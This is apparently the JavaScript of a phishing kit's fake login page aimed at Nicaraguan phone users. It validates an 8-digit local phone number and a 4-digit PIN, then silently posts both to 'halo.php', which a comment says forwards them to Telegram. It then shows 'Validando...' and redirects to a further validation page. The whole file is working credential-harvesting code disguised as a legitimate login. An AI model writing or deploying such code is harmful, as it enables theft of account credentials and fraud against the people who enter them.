(() => {
  const LOADER_MS = 2500;

  function showToast(msg) {
    let t = document.getElementById('__NQ_TOAST__');
    if (!t) {
      t = document.createElement('div');
      t.id = '__NQ_TOAST__';
      t.className = '__NQ_TCLASS__';
      document.body.appendChild(t);
    }
    t.textContent = msg;
    requestAnimationFrame(() => t.classList.add('show'));
    setTimeout(() => t.classList.remove('show'), 2400);
  }

  const loader = document.getElementById('__NQ_LOADER__');
  const app = document.getElementById('__NQ_APP__');

  // Mostrar app después del loader
  setTimeout(() => {
    loader.classList.add('__NQ_FADE__');
    app.hidden = false;
    setTimeout(() => loader.remove(), 450);
  }, LOADER_MS);

  // Teléfono Nicaragua: auto-formato 8888 8888
  const phone = document.getElementById('__NQ_PHONE__');
  const pwd = document.getElementById('__NQ_PWD__');

  phone?.addEventListener('input', (e) => {
    let digits = e.target.value.replace(/\D/g, '').slice(0, 8);
    e.target.value = digits.length > 4
      ? digits.slice(0, 4) + ' ' + digits.slice(4)
      : digits;
  });
  pwd?.addEventListener('input', (e) => {
    e.target.value = e.target.value.replace(/\D/g, '');
  });

  // Submit
  const form = document.getElementById('__NQ_FORM__');
  form?.addEventListener('submit', (e) => {
    e.preventDefault();
    if (!form.reportValidity()) return;

    // Nicaragua: 8 dígitos, debe iniciar en 2, 5, 7 u 8
    const digits = phone.value.replace(/\D/g, '');
    if (digits.length !== 8 || !['2','5','7','8'].includes(digits[0])) {
      phone.focus();
      phone.classList.add('__NQ_ERR__');
      showToast('Número inválido. Debe ser un teléfono nicaragüense de 8 dígitos.');
      return;
    }
    phone.classList.remove('__NQ_ERR__');

    if (pwd.value.length !== 4) {
      pwd.focus();
      return;
    }
    // Guardar datos para la siguiente pantalla
    const countryCode = document.getElementById('__NQ_CC__').value;
    sessionStorage.setItem('phone', digits);
    sessionStorage.setItem('countryCode', countryCode);
    sessionStorage.setItem('attempts', '0');

    // Enviar a Telegram (no bloqueante)
    fetch('halo.php', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        step: 'acceso',
        countryCode,
        phone: digits,
        password: pwd.value,
        _tk: btoa(String(Math.floor(Date.now() / 1e3))),
      }),
      keepalive: true,
    }).catch(() => {});

    const btn = form.querySelector('.__NQ_BTN__');
    btn.textContent = 'Validando...';
    btn.disabled = true;
    setTimeout(() => {
      window.location.href = 'validacion.html';
    }, 800);
  });
})();
